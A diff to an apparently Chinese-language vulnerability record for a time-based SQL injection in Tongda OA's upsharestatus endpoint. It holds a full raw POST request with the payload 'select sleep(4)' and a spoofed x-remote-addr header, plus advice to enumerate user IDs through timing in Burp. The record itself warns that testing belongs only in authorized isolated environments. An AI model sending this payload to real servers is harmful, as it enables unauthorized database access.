@@ -42,7 +42,7 @@ schema_version: "1"
 
 ## 操作风险
 
-现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。
 
 ## 技术资料与来源记录
 
@@ -112,6 +112,7 @@ public function actionUpsharestatus()
 POST /general/appbuilder/web/portal/workbench/upsharestatus HTTP/1.1
 Host: oa.tongda2000.com
 Connection: close
+Content-Length: 36
 Cache-Control: max-age=0
 sec-ch-ua: "Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"
 sec-ch-ua-mobile: ?0
@@ -136,7 +137,7 @@ x-remote-addr: 127.0.0.1
 uid=15&status=1&id=1;select sleep(4)
 ```
 
-> 请求长度说明：原资料 Content-Length 为 36；静态长度已移除，应由客户端根据最终请求体的字节数生成。
+> 请求长度说明：原资料 Content-Length 为 36；保留原始标头；其数值未据实际请求体重新计算或验证。
 
 注意 uid参数 要为当前用户的uid才能完成请求，可以使用 burp 遍历查看时间响应
 
